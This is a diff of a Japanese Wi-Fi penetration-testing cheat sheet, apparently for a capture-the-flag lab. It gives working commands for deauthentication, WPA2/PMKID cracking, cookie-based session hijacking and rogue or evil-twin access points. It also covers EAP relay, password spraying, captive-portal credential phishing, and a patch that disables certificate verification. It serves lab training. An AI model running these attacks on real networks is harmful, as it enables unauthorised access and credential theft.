-```
+### 4.5. 取得したパスワードで接続
 
 ```conf
+network={
+    ssid="wifi-event"
+    psk="@MegaPSKP@ssword!@"
+}
+```
+
+```bash
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/event.conf
+sudo dhclient wlan2 -v
+# → ネットワークにアクセスし、ルーターからフラグを取得
+```
+
+---
+
+## 🔐 セクション5: PSK（WPA2-Personal）への攻撃
+
+### 5.1. 4-Way Handshake のキャプチャ + 辞書攻撃
+
+**前提条件:** ネットワークに接続しているクライアントが存在すること。
+
+#### ステップ1: カードをターゲットチャンネルに固定
+
+```bash
+# スキャンからチャンネルを確認
+sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan
+# 仮定: wifi-mobile は CH=6、BSSID=F0:9F:C2:71:22:12
+```
+
+> ⚠️ **なぜ固定？** `airodump-ng` は `-c` なしだとチャンネルを巡回し、Handshake を見逃す可能性がある。
+
+#### ステップ2: 再接続を強制する Deauth
+
+```bash
+sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT-MAC> wlan0mon
+```
+
+#### ステップ3: 同時キャプチャ
+
+```bash
+sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 \
+  -w ~/wifi/scanc6
+# この行が表示されたら成功:
+# [ WPA handshake: F0:9F:C2:71:22:12
+```
+
+#### ステップ4: 辞書攻撃
+
+```bash
+aircrack-ng ~/wifi/scanc6-01.cap -w /root/rockyou-top100000.txt
+# 出力: KEY FOUND! [ starwars1 ]
+```
+
+#### ステップ5: 接続と悪用
+
+```conf
+network={
+    ssid="wifi-mobile"
+    psk="starwars1"
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}
+```
+
+```bash
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/psk.conf
+sudo dhclient wlan3 -v
+ip a show wlan3
+ip route | grep default
+```
+
+---
+
+### 5.2. WPA2 トラフィックの復号（パッシブ復号）
+
+**ステップ1: cap ファイルの復号**
+```bash
+airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap
+# 出力: ~/wifi/scanc6-01-dec.cap
+```
+
+| フラグ | 意味 |
+|-----|------|
+| `-e` | ESSID |
+| `-p` | PSK パスワード |
+
+**ステップ2: 復号されたトラフィックの分析**
+
+```bash
+wireshark ~/wifi/scanc6-01-dec.cap
+# フィルタ: http
+```
+
+**サーバー IP の抽出:**
+```bash
+tshark -r ~/wifi/scanc6-01-dec.cap -Y "http" -T fields -e ip.dst | sort -u
+# 192.168.2.1（ルーター）
+# 192.168.2.8（ユーザーサーバー）
+```
+
+**Cookie の抽出:**
+```bash
+tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" \
+  -T fields -e ip.src -e ip.dst -e http.cookie
+# 192.168.2.8  192.168.2.1  PHPSESSID=296228e3896440bd508d4c69e11e265c
+```
+
+**Set-Cookie の抽出:**
+```bash
+tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.set_cookie" \
+  -T fields -e ip.src -e ip.dst -e http.set_cookie
+```
+
+---
+
+### 5.3. 窃取した Cookie によるセッションハイジャック
+
+**ステップ1: ネットワークへの接続**（取得したパスワードで — ステップ 5.1.5）
+
+**ステップ2: Cookie を使ってログイン**
+
+```bash
+# 最初のテスト
+curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
+  http://192.168.2.1/
+
+# リダイレクトが発生した場合
+curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
+  http://192.168.2.1/
+```
+
+**ステップ3: フラグの抽出**
+```bash
+curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
+  http://192.168.2.1/ | grep -o 'flag{[^}]*}'
+```
+
+---
+
+### 5.4. Client Isolation の確認
+
+**ステップ1: ネットワークへの接続**（ステップ 5.1.5）
+
+**ステップ2: ARP スキャン**
+```bash
+sudo arp-scan -I wlan3 -l
+```
+
+**出力例:**
+```
+192.168.2.1  f0:9f:c2:71:22:12  Ubiquiti Networks Inc.   # ルーター
+192.168.2.7  28:6c:07:6f:f9:43  XIAOMI Electronics       # ユーザーサーバー
+192.168.2.8  28:6c:07:6f:f9:44  XIAOMI Electronics       # 自分（MAC 変更後は別）
+```
+
+**ステップ3: ユーザーサーバーへのアクセス**
+```bash
+for ip in 192.168.2.7 192.168.2.9 192.168.2.10; do
+    echo "=== $ip ==="
+    curl -s -m 3 http://$ip/ | grep -o 'flag{[^}]*}'
+done
+```
+
+> **解釈:** `192.168.2.7` への `curl` が成功 → **Client Isolation は無効** でフラグ取得。タイムアウト → 有効。
+
+---
+
+### 5.5. Rogue AP + Probe からの Handshake（隠し/不在ネットワーク）
+
+**シナリオ:** `wifi-offices` が範囲内にないが、クライアントが Probe を送信している。
+
+#### ステップ1: Probe の特定
+
+```bash
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
+  -T fields -e wlan.sa -e wlan.ssid
+# 観察: 78:c1:a7:bf:72:46 → wifi-offices
+```
+
+#### ステップ2: hostapd-mana で Rogue AP を作成
+
+```conf
+# ~/wifi/hostapd-mana.conf
 interface=wlan1
 driver=nl80211
 hw_mode=g
@@ -544,1029 +659,700 @@ wpa_pairwise=TKIP CCMP
 wpa_passphrase=12345678
 ```
 
+| パラメータ | 意味 |
+|---------|---------|
+| `interface=wlan1` | managed インターフェース（monitor ではない） |
+| `ssid=wifi-offices` | ターゲットのネットワーク名 |
+| `mana_wpaout=hostapd.hccapx` | Handshake の出力ファイル |
+| `wpa_passphrase=12345678` | 偽 AP のパスワード |
+
+#### ステップ3: 実行してクライアント接続を待つ
+
 ```bash
-# 2. Rogue AP を実行
-sudo hostapd-mana hostapd.conf
-
-# 3. 実 AP からクライアントに Deauth (存在する場合)
-sudo aireplay-ng -0 10 -a <REAL_BSSID> -c <CLIENT_MAC> wlan0mon
-
-# 4. クライアントが接続すると、Handshake が hostapd.hccapx に保存される
-
-# 5. クラック
-hashcat -a 0 -m 22000 hostapd.hccapx /root/rockyou-top100000.txt --force
+sudo hostapd-mana ~/wifi/hostapd-mana.conf
+# クライアントの Probe→Assoc→Handshake を待つ
+# メッセージ: AP-STA-POSSIBLE-PSK-MISMATCH（パスワードが違うため）
 ```
 
-**注意:** `hashcat -m 2500` がエラーを出す場合:
+#### ステップ4: Handshake のクラック
+
 ```bash
-# hccapx を pcap に変換
+# 直接法
+hashcat -a 0 -m 2500 hostapd.hccapx /root/rockyou-top100000.txt --force
+
+# エラーの場合 → 22000 に変換
 hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
-# 22000 を抽出
 hcxpcapngtool aux.pcap -o hash.22000
-# クラック
-hashcat -m 22000 hash.22000 rockyou.txt
+hashcat -a 0 -m 22000 hash.22000 /root/rockyou-top100000.txt --force
+
+# 結果を表示
+hashcat -m 22000 hash.22000 --show
+# 3d0695...:020000000100:78c1a7bf7246:wifi-offices:password1
 ```
 
-### 6.4. 接続 + 復号 + ポストエクスプロイト
+→ **パスワード = `password1`**
+
+#### ステップ5: 接続とアクセス
 
 ```conf
-# psk.conf
 network={
-    ssid="wifi-mobile"
-    psk="starwars1"
+    ssid="wifi-offices"
+    psk="password1"
 }
 ```
 
 ```bash
-# 接続
-sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
-sudo dhclient wlan3 -v
-
-# トラフィックを復号
-airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/psk-01.cap
-# 出力: psk-01-dec.cap
-
-# 分析
-wireshark ~/wifi/psk-01-dec.cap
-# フィルター: http
-
-# Cookie を抽出
-tshark -r ~/wifi/psk-01-dec.cap -Y "http.cookie" -T fields -e http.cookie
-
-# Cookie を使用
-curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
-```
-
-### 6.5. Client Isolation のテスト
-
-```bash
-# ネットワークに接続
-sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
-sudo dhclient wlan3 -v
-
-# ARP スキャン
-sudo arp-scan -I wlan3 -l
-
-# 別クライアントのサーバーへのアクセスをテスト
-curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/offices.conf
+sudo dhclient wlan2 -v
 ```
 
 ---
 
-<a name="wpa3"></a>
-## 7. フェーズ 4: WPA3-SAE ブランチ
+### 5.6. PMKID 攻撃（クライアント不要 — クライアントがいないネットワーク向け）
 
-```
-WPA3-SAE (ENC=WPA3, AUTH=SAE)
-│
-├── Transition Mode (WPA2+WPA3)?
-│   │   (RSN Auth Suites: PSK SAE)
-│   │
-│   ├── はい → ダウングレード攻撃
-│   │   ├── 1. WPA2-PSK で Rogue AP を構築
-│   │   ├── 2. hostapd-mana with wpa_key_mgmt=WPA-PSK
-│   │   ├── 3. クライアントに Deauth (PMF 無効の場合)
-│   │   ├── 4. クライアントが偽 AP に接続
-│   │   ├── 5. WPA2 Handshake キャプチャ
-│   │   └── 6. hashcat -m 22000 (高速!)
-│   │
-│   └── WPA3-only
-│       └── wacker.py (オンラインブルートフォース)
-│           ├── ./wacker.py --wordlist rockyou.txt --ssid <SSID>
-│           │              --bssid <BSSID> --interface wlan2 --freq 2462
-│           ├── "Found the password" を待つ
-│           └── key_mgmt=SAE, ieee80211w=2 で接続
-│
-└── PMF 必須 (MFP-required)?
-    ├── はい → Deauth は効かない
-    │         → Dragonblood DoS (dragondrain)
-    └── いいえ → Deauth 可能
-```
+**シナリオ:** `wifi-campus` にクライアントがいない — Handshake をキャプチャできない。
 
-### 7.1. Transition Mode の検出
+#### ステップ1: 専用インターフェースの準備
 
 ```bash
-sudo iw dev wlan2 scan | grep -A 15 "wifi-IT"
+sudo pkill wpa_supplicant
+sudo pkill dhclient
+sudo airmon-ng check kill
 ```
 
-**出力:**
-```
-RSN: * Authentication suites: PSK SAE
-     * Capabilities: MFP-capable (0x008c)
+> ⚠️ **重要:** `wlan0mon` を使わない（`phy#0` 上で `wlan0` と共有され、`hcxdumptool` が `failed to arm interface` エラーを出す）。
+
+```bash
+# 別の phy にモニターインターフェースを作成
+sudo iw phy phy70 interface add wlan6mon type monitor
+sudo ip link set wlan6mon up
+sudo iw dev wlan6mon set channel 7
+iw dev wlan6mon info
 ```
 
-| Auth Suites | Capabilities | 解釈 |
-|-------------|--------------|--------|
-| `PSK SAE` | MFP-capable | Transition Mode ✅ |
-| `SAE` | MFP-required | WPA3-only ❌ |
+#### ステップ2: hcxdumptool の実行
 
-### 7.2. ダウングレード攻撃 (Transition Mode)
+```bash
+sudo hcxdumptool -i wlan6mon -w campus.pcapng -c 7a --rds=2 -A
+```
+
+| フラグ | 意味 |
+|-----|------|
+| `-i wlan6mon` | 専用モニターインターフェース |
+| `-w campus.pcapng` | 出力ファイル |
+| `-c 7a` | チャンネル 7、2.4GHz バンド |
+| `--rds=2` | AP/PMKID のライブ表示 |
+| `-A` | フレームに ACK |
+
+**成功時の出力:**
+```
+CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID
+  7|11:31:18|ep+  +|980EE416B9E3|f09fc2712231|wifi-campus
+```
+
+#### ステップ3: ハッシュの抽出
+
+```bash
+hcxpcapngtool -o campus.22000 campus.pcapng
+```
+
+#### ステップ4: クラック
+
+```bash
+hashcat -m 22000 -a 0 campus.22000 /root/rockyou-top100000.txt --force
+# → basketball
+```
+
+#### ステップ5: 接続
 
 ```conf
-# hostapd-sae.conf
-interface=wlan1
-driver=nl80211
-hw_mode=g
-channel=11
-ssid=wifi-IT
-mana_wpaout=hostapd-management.hccapx
-wpa=2
-wpa_key_mgmt=WPA-PSK     # ← WPA2、SAE ではない!
-wpa_pairwise=TKIP CCMP
-wpa_passphrase=12345678
-```
-
-```bash
-# 1. Rogue AP を実行
-sudo hostapd-mana hostapd-sae.conf
-
-# 2. クライアントに Deauth
-sudo aireplay-ng -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon
-
-# 3. Handshake をクラック
-hashcat -a 0 -m 2500 hostapd-management.hccapx rockyou.txt --force
-```
-
-### 7.3. wacker.py (オンラインブルートフォース)
-
-```bash
-# インストール
-git clone https://github.com/blunderbuss-wctf/wacker.git
-cd wacker
-
-# 実行
-./wacker.py --wordlist ~/rockyou-top100000.txt \
-            --ssid wifi-management \
-            --bssid F0:9F:C2:11:0A:24 \
-            --interface wlan2 \
-            --freq 2462
-```
-
-**注意:** `--freq` は AP の周波数 (チャンネルではない):
-- チャンネル 11 → 2462 MHz
-- チャンネル 6 → 2437 MHz
-- チャンネル 1 → 2412 MHz
-
-### 7.4. WPA3-SAE への接続
-
-```conf
-# wpa3.conf
-ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
-update_config=1
 network={
-    ssid="wifi-management"
-    key_mgmt=SAE
+    ssid="wifi-campus"
+    psk="basketball"
+    key_mgmt=WPA-PSK
     proto=RSN
     pairwise=CCMP
-    group=CCMP
-    psk="chocolate1"
-    ieee80211w=2      # ← PMF 必須!
+    scan_ssid=1
 }
 ```
 
 ```bash
-sudo wpa_supplicant -i wlan2 -c wpa3.conf -B
-sudo dhclient -v wlan2
+sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/campus.conf
+sudo dhclient wlan3 -v
+# AP の Web サイトにアクセスしてフラグを取得
 ```
-
-### 7.5. Dragonblood DoS (WPA3-only、PMF 必須)
-
-```bash
-# インストール
-cd /root/tools/dragondrain-and-time/
-autoreconf -i && ./configure && make
-
-# 実行
-cd /root/tools/dragondrain-and-time/src/
-sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
-```
-
-**成功指標:** `[ STATUS: 200 forged handshakes/sec ]`
 
 ---
 
-<a name="mgt"></a>
-## 8. フェーズ 5: WPA2-Enterprise (MGT) ブランチ
+## 🏢 セクション6: MGT（WPA2/WPA3-Enterprise）への攻撃
 
-```
-WPA2-Enterprise (AUTH=MGT)
-│
-├── フェーズ 0: パッシブ偵察 (攻撃なし)
-│   ├── tshark -r cap -Y "eap.identity" -T fields -e eap.identity
-│   │   → ユーザー名 (例: GLOBAL\GlobalAdmin)
-│   │
-│   └── tshark -r cap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate
-│       | xxd -r -p | openssl x509 -inform DER -noout -subject
-│       → CN, O, emailAddress
-│
-├── フェーズ 1: EAP メソッドの特定
-│   └── tshark -r cap -Y "eap" -T fields -e eap.type | sort | uniq -c
-│       ├── 4  → EAP-MD5
-│       ├── 6  → EAP-GTC
-│       ├── 13 → EAP-TLS
-│       ├── 21 → EAP-TTLS
-│       ├── 25 → PEAP
-│       ├── 18 → EAP-SIM
-│       ├── 23 → EAP-AKA
-│       └── 50 → EAP-AKA'
-│
-└── フェーズ 2: メソッド別の攻撃
-    │
-    ├── EAP-MD5 (コード 4)
-    │   ├── hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
-    │   └── hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt
-    │
-    ├── PEAP (コード 25) または EAP-TTLS (コード 21)
-    │   │
-    │   ├── 方法 1: Evil Twin (eaphammer)
-    │   │   ├── eaphammer --cert-wizard (証明書生成)
-    │   │   ├── eaphammer -i wlan2 --auth wpa-eap --essid "target"
-    │   │   │            --creds --autocrack --wordlist rockyou.txt
-    │   │   └── クライアントに Deauth
-    │   │
-    │   ├── 方法 2: GTC ダウングレード (クライアントが証明書を検証する場合)
-    │   │   ├── eaphammer --creds --negotiate gtc-downgrade
-    │   │   └── ログに平文パスワード
-    │   │
-    │   └── 方法 3: Relay 攻撃
-    │       ├── berate_ap --wpa-sycophant wlan1 lo target
-    │       └── wpa_sycophant -c conf -i wlan3
-    │
-    ├── EAP-TLS (コード 13)
-    │   │
-    │   ├── ケース 1: 本物のサーバー証明書あり
-    │   │   └── eaphammer --cert-wizard import
-    │   │       --server-cert server.crt --ca-cert ca.crt --private-key server.key
-    │   │
-    │   ├── ケース 2: CA.key あり (最良!)
-    │   │   ├── openssl genrsa -out fake.key 2048
-    │   │   ├── openssl req -new -key fake.key -out fake.csr
-    │   │   └── openssl x509 -req -in fake.csr -CA ca.crt -CAkey ca.key -out fake.crt
-    │   │
-    │   └── ケース 3: 何もなし
-    │       └── hostapd-wpe (任意の証明書を受理)
-    │
-    ├── EAP-GTC (コード 6)
-    │   └── eaphammer --creds --negotiate gtc-downgrade
-    │
-    ├── EAP-SIM/AKA/AKA' (コード 18/23/50)
-    │   ├── 1. パッシブ: tshark -Y "eap.identity"
-    │   ├── 2. IMSI のみ必要な場合:
-    │   │   ├── hostapd with eap_sim_id=0
-    │   │   ├── sim_db with fake IMSI
-    │   │   └── tshark -Y "eap.type == 50" -V | grep IMSI
-    │   └── 3. Identity から IMSI を抽出
-    │
-    └── オンラインブルートフォース (任意のメソッド)
-        ├── air-hammer -i wlan3 -e target -p rockyou.txt -u userlist
-        └── air-hammer -i wlan3 -e target -P 12345678 -u userlist
-```
-
-### 8.1. パッシブ偵察 (ユーザー名と証明書の抽出)
+### 6.1. 前提条件
 
 ```bash
-# 1. Identity からユーザー名
-tshark -r ~/wifi/scanc44-01.cap -Y "eap.identity" -T fields -e eap.identity | sort -u
-# 出力: GLOBAL\GlobalAdmin, anonymous@CONTOSOREG, ...
+sudo apt update
+sudo apt install -y eaphammer hostapd-wpe asleap hashcat john aircrack-ng
+git clone https://github.com/s0lst1c3/eaphammer.git
+cd eaphammer && sudo ./kali-setup
+```
 
-# 2. サーバー証明書
-tshark -r ~/wifi/global-01.cap \
-  -Y "tls.handshake.certificate && wlan.sa == F0:9F:C2:71:22:17" \
-  -T fields -e tls.handshake.certificate 2>/dev/null \
-  | head -n 1 | xxd -r -p \
-  | openssl x509 -inform DER -noout -subject -nameopt RFC2253
+### 6.2. EAP タイプの特定（Recon）
+
+#### ステップ1: ネットワークのスキャン
+
+```bash
+sudo airodump-ng wlan0mon --band abg
+# MGT ネットワークを見つける（例: wifi-corp-legacy、CH=44、BSSID=F0:9F:CB:3F:BC:27）
+```
+
+#### ステップ2: EAP トラフィックのキャプチャ
+
+```bash
+sudo airodump-ng -c 44 --bssid F0:9F:CB:3F:BC:27 \
+  -w ~/wifi/legacy wlan0mon
+```
+
+#### ステップ3: tshark で分析
+
+```bash
+tshark -r ~/wifi/legacy-01.cap -Y "eap" -T fields \
+  -E header=y -E separator='|' \
+  -e frame.number -e wlan.sa -e wlan.da \
+  -e eap.code -e eap.type -e eap.identity -e eap.md5.value
+```
+
+**EAP コード:**
+
+| コード | EAP タイプ | 攻撃手法 |
+|----|---------|----------|
+| 4 | EAP-MD5 | 盗聴 + オフラインクラック（hashcat -m 4800） |
+| 6 | EAP-GTC | Rogue AP + GTC Downgrade（平文） |
+| 13 | EAP-TLS | Rogue AP + 証明書窃取 |
+| 21 | EAP-TTLS | Rogue AP + MSCHAPv2（hashcat -m 5500） |
+| 25 | PEAP | Rogue AP + MSCHAPv2 / GTC Downgrade |
+
+---
+
+### 6.3. EAP-MD5 攻撃（コード 4） — パッシブ盗聴
+
+**ステップ1: キャプチャ**（上記で実施済み）
+
+**ステップ2: Challenge/Response の抽出**
+
+```bash
+tshark -r ~/wifi/legacy-01.cap -Y "eap.type == 4" \
+  -T fields -e frame.number -e eap.id -e eap.code -e eap.md5.value
 ```
 
 **出力例:**
 ```
-subject=emailAddress=server@WiFiChallenge.com,CN=radius.wifichallenge.com,
-        OU=Server,O=WiFiChallenge,L=Madrid,ST=Madrid,C=ES
+1338  219  1  9d36b0771289ff6cac0d87908e3c3e6f   # Challenge（サーバー）
+1339  219  2  7aa0513eabcf931d0b6b426857e6f573   # Response（クライアント）
 ```
 
-### 8.2. EAP メソッドの特定
-
-```bash
-tshark -r capture.cap -Y "eap" -T fields -e eap.type | sort | uniq -c
+**Identity:**
+```
+1337  WORKGROUP\administrator
 ```
 
-**EAP コード表:**
-
-| コード | メソッド | 攻撃 |
-|:--:|--------|------|
-| 1 | Identity | パッシブ (ユーザー名) |
-| 4 | EAP-MD5 | hashcat -m 4800 |
-| 6 | EAP-GTC | gtc-downgrade |
-| 13 | EAP-TLS | クライアント証明書 |
-| 18 | EAP-SIM | IMSI 抽出 |
-| 21 | EAP-TTLS | eaphammer + asleap |
-| 23 | EAP-AKA | IMSI 抽出 |
-| 25 | PEAP | eaphammer + asleap |
-| 50 | EAP-AKA' | IMSI 抽出 |
-
-### 8.3. EAP-MD5 (最も簡単)
+**ステップ3: hashcat 形式への変換**
 
 ```bash
-# ハッシュを抽出
-hcxpcapngtool --eapmd5=legacy.hc4800 legacy-01.cap
+hcxpcapngtool --eapmd5=legacy.hc4800 ~/wifi/legacy-01.cap
+```
 
-# クラック
+**ステップ4: クラック**
+
+```bash
 hashcat -m 4800 -a 0 legacy.hc4800 /root/rockyou-top100000.txt
+# 出力: 7aa051...:9d36b...:db:pinkfloyd7
 ```
 
-### 8.4. PEAP/TTLS (最も一般的)
+**式:** `Response = MD5(ID || Password || Challenge)`
+
+**ステップ5: フラグの構築**
+
+```
+flag{WORKGROUP\administrator:pinkfloyd7}
+```
+
+---
+
+### 6.4. PEAP / EAP-TTLS 攻撃 — Rogue AP
+
+**シナリオ:** クライアントが `wifi-corp-legacy`（MGT）に接続し、証明書を持っている。
+
+#### ステップ1: クライアントとチャンネルの特定
 
 ```bash
-cd /root/tools/eaphammer
+sudo airodump-ng wlan0mon --band abg -w ~/wifi/legacy
+# BSSID = F0:9F:CB:3F:BC:27, CH = 44, Client = 64:32:A8:AD:AB:53
+```
 
-# 1. 偽証明書を生成 (本物の証明書の詳細を使用)
-sudo python3 eaphammer --cert-wizard
+#### ステップ2: 再接続を強制する Deauth
 
-# 2. Rogue AP を実行
-sudo python3 eaphammer -i wlan2 \
+```bash
+sudo aireplay-ng --deauth 10 -a F0:9F:CB:3F:BC:27 \
+  -c 64:32:A8:AD:AB:53 wlan0mon
+```
+
+#### ステップ3: 偽証明書の生成
+
+```bash
+cd ~/eaphammer
+python3 eaphammer --cert-wizard
+# → CA 証明書とサーバー証明書が作成される
+```
+
+#### ステップ4: Rogue AP の起動
+
+```bash
+sudo python3 eaphammer -i wlan1 \
   --channel 44 \
   --auth wpa-eap \
-  --essid "wifi-corp" \
+  --essid "wifi-corp-legacy" \
   --creds \
   --autocrack \
   --wordlist /root/rockyou-top100000.txt
+```
 
-# 3. クライアントに Deauth (別ターミナル)
-sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon
+| パラメータ | 意味 |
+|---------|---------|
+| `-i wlan1` | managed インターフェース |
+| `--channel 44` | ターゲットチャンネル |
+| `--auth wpa-eap` | WPA2-Enterprise |
+| `--essid "..."` | ターゲットのネットワーク名 |
+| `--creds` | 認証情報の収集 |
+| `--autocrack` | MSCHAPv2 の自動クラック |
+| `--wordlist` | ワードリスト |
 
-# 4. クライアントが証明書を検証する場合 (unknown CA エラー):
-sudo python3 eaphammer -i wlan2 \
+#### ステップ5: 成功時の出力（MSCHAPv2）
+
+```
+[+] Captured EAP identity: WORKGROUP\administrator
+[+] MSCHAPv2 challenge: aabbccdd...
+[+] MSCHAPv2 response: 00112233...
+```
+
+**手動クラック（`--autocrack` がない場合）:**
+```bash
+asleap -C <CHALLENGE> -R <RESPONSE> -W /root/rockyou-top100000.txt
+```
+
+**または hashcat:**
+```bash
+# ハッシュ形式: username::::response:challenge
+hashcat -m 5500 hash.txt /root/rockyou-top100000.txt
+```
+
+#### ステップ6: GTC Downgrade（クライアントが証明書を拒否した場合）
+
+```bash
+sudo python3 eaphammer -i wlan1 \
   --channel 44 \
   --auth wpa-eap \
-  --essid "wifi-corp" \
+  --essid "wifi-corp-legacy" \
   --creds \
   --negotiate gtc-downgrade
 ```
 
-**MSCHAPv2 出力:**
+→ パスワードが **平文** でログに表示:
 ```
-domain\username:  CONTOSO\juan.tr
-challenge:        3b:04:8b:cb:93:78:9a:e3
-response:         99:7e:f7:19:b2:b7:2f:e9:15:42:32:88:77:76:ab:a6:3d:ed:28:85:87:33:0a:62
-hashcat NETNTLM:  juan.tr::::997ef...:3b048...
+[+] EAP identity: WORKGROUP\administrator
+[+] GTC Password: pinkfloyd7
 ```
+
+---
+
+### 6.5. EAP-TLS 攻撃（コード 13） — 任意の証明書を受け入れる Rogue AP
+
+**シナリオ:** 証明書による相互認証 — クライアント証明書を窃取する必要がある。
+
+#### ステップ1: hostapd-wpe のコンパイル
 
 ```bash
-# 手動クラック
-echo 'juan.tr::::997ef...:3b048...' > hash.5500
-hashcat -a 0 -m 5500 hash.5500 rockyou.txt --force
+git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git
+cd hostapd-wpe
+# https://w1.fi/releases/ から hostapd-2.6.tar.gz をダウンロード
+tar -xzf hostapd-2.6.tar.gz
+cd hostapd-2.6
+patch -p1 < ../hostapd-wpe.patch
+cd hostapd
+make && sudo make install
 ```
 
-### 8.5. EAP-TLS (最も難しい)
+#### ステップ2: 任意の証明書を受け入れるようにコードを修正
 
-#### ケース A: 本物のサーバー証明書あり
-
-```bash
-cd /root/tools/eaphammer
-
-# 本物の証明書をインポート
-sudo python3 ./eaphammer --cert-wizard import \
-  --server-cert /home/user/Downloads/server.crt \
-  --ca-cert /home/user/Downloads/ca.crt \
-  --private-key /home/user/Downloads/server.key
-
-# Rogue AP を実行
-sudo python3 ./eaphammer -i wlan4 --auth wpa-eap --essid "wifi-corp" \
-  --creds --negotiate balanced
-
-# Deauth
-sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:BA:6C:41 wlan0mon
 ```
-
-#### ケース B: CA.key あり (最良!)
-
-```bash
-# 任意ユーザーの偽証明書を生成
-openssl genrsa -out client.key 2048
-openssl req -config client.conf -new -key client.key -out client.csr
-openssl x509 -days 730 -extfile client.ext \
-  -CA ca.crt -CAkey ca.key -CAserial ca.serial \
-  -in client.csr -req -out client.crt
+ファイル: src/crypto/tls_openssl.c
+変更: SSL_set_verify(ssl, SSL_VERIFY_PEER, ...) 
+    →  SSL_set_verify(ssl, SSL_VERIFY_NONE, ...)
 ```
+その後、再度 `make && make install`。
+
+#### ステップ3: 設定
 
 ```conf
-# wpa_tls.conf
-network={
-    ssid="wifi-global"
-    scan_ssid=1
-    proto=RSN
-    key_mgmt=WPA-EAP
-    eap=TLS
-    identity="GLOBAL\GlobalAdmin"
-    ca_cert="./ca.crt"
-    client_cert="./client.crt"
-    private_key="./client.key"
-}
-```
-
-```bash
-sudo wpa_supplicant -Dnl80211 -i wlan3 -c ~/Downloads/wpa_tls.conf -B
-sudo dhclient wlan3 -v
-```
-
-### 8.6. Relay 攻撃 (PEAP)
-
-**シナリオ:** クライアントが偽証明書を拒否。ハッシュを本物の AP に中継する。
-
-```bash
-# ターミナル 1: Rogue AP
-cd ~/tools/berate_ap/
-sudo ./berate_ap --eap --mana-wpe --wpa-sycophant \
-  --mana-credout outputMana.log -c 44 wlan1 lo wifi-regional-tablets
-
-# ターミナル 2: Relay
-cd ~/tools/wpa_sycophant/
-sudo ./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
-
-# ターミナル 3: Deauth
-sudo aireplay-ng --ignore-negative-one -0 0 \
-  -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55 wlan0mon
-```
-
-**`wpa_sycophant_example.conf`:**
-```conf
-network={
-  ssid="wifi-regional"     # ← 侵入したいネットワーク
-  scan_ssid=1
-  key_mgmt=WPA-EAP
-  identity=""
-  anonymous_identity=""
-  password=""
-  eap=PEAP
-  phase1="peapver=1"
-  phase2="auth=MSCHAPV2"
-  bssid_blacklist=F0:9F:C2:00:00:00   # ← 自分の偽 AP を無視
-}
-```
-
-### 8.7. air-hammer によるブルートフォース
-
-```bash
-cd ~/tools/air-hammer
-
-# 方法 1: 1 ユーザー + パスワードリスト
-echo 'CONTOSO\test' > test.user
-python2 ./air-hammer.py -i wlan3 -e wifi-corp -p rockyou.txt -u test.user
-
-# 方法 2: ユーザーリスト + 1 パスワード (Password Spray)
-cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > users.txt
-python2 ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u users.txt
-```
-
-### 8.8. Evil Twin + フィッシング (Hostile Portal)
-
-**シナリオ:** クライアントが別ネットワークを Probe 送信。
-
-```bash
-# 1. Hostile Portal で Rogue AP を実行
-cd ~/tools/eaphammer
-sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan2 --hostile-portal
-
-# 2. クライアントに Deauth
-sudo aireplay-ng --ignore-negative-one -0 0 \
-  -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51 wlan0mon
-
-# 3. NetNTLMv2 を抽出
-cd ~/tools/eaphammer
-cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600
-
-# 4. クラック
-hashcat -a 0 -m 5600 responder.5600 rockyou.txt --force
-```
-
-**または Captive Portal で:**
-```bash
-sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan4 --captive-portal
-
-# POST をスニッフィング
-sudo tshark -i wlan4 -Y "http.request.method == \"POST\"" -T fields -e http.file_data
-# 出力: username=CORPO\god&password=tommy1
-```
-
-### 8.9. IMSI 抽出 (EAP-SIM/AKA/AKA')
-
-```bash
-# 1. パッシブ: Identity を確認
-sudo airodump-ng wlan0mon -c 48 --bssid F0:9F:C2:71:22:19 -w recon
-tshark -r recon-01.cap -Y "eap.identity" -T fields -e eap.identity
-# 出力: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com
-
-# 2. 正確なメソッドを特定
